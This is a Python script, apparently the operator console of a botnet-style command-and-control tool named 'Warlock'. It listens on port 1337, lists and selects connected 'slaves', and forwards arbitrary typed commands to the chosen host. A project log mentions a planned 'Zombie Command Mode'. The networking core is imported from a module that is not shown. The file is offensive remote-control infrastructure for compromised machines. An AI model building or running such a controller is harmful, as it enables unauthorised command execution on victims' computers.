#!/usr/bin/python3
# -*- coding: utf-8 -*-
'''
Project Log
1. Waiting: Zombie Command Mode
2. Waiting: Transfer Crypt Mode
3. Waiting: Auto Completer Mode
4.

'''
import os, sys, time
import threading
import socket
import argparse
import pymysql
from s_core.base import Warlock
from s_core.settings import BANNER

# =======================================================================

def main():

    warlock = Warlock()
    warlock.setDaemon(True)
    warlock.start()
    print(BANNER)
    print("[INFO] Warlock Start: Listening On Port 1337")

    # API: Server Function
    spells1 = {
        # On Server Side
        'help':         warlock.printHelp,
        'slaves':       warlock.showSlaves,
        'select':       warlock.selectSlave,
        'back':         warlock.back2all,
    }
    # API: Client Functions: When Client Received
    spells2 = {
        'quit':         'Slave Stop Running',
    }

    print("[INFO] Welcome To Warlock, Master.")
    while True:

        csid = warlock.currentSid if warlock.currentSid else '*'
        prompt = input("<WarLock>[{}] >>> ".format(csid))
        if not prompt:
            continue
        cmd, _, action = prompt.partition(' ')
        if cmd in spells1:
            spells1[cmd](action)
        elif cmd == 'exit':
            break
        else:
            try:
                warlock.command(int(csid), prompt)
            except socket.error as e:
                print("[INFO] Command Send Failed.")
    try:
        warlock.s.shutdown(socket.SHUT_RDWR)
    except socket.error as e:
        pass
    warlock.s.close()
    print("[INFO] Have a Nice Day, Master.")
    sys.exit(0)


if __name__ == '__main__':
    main()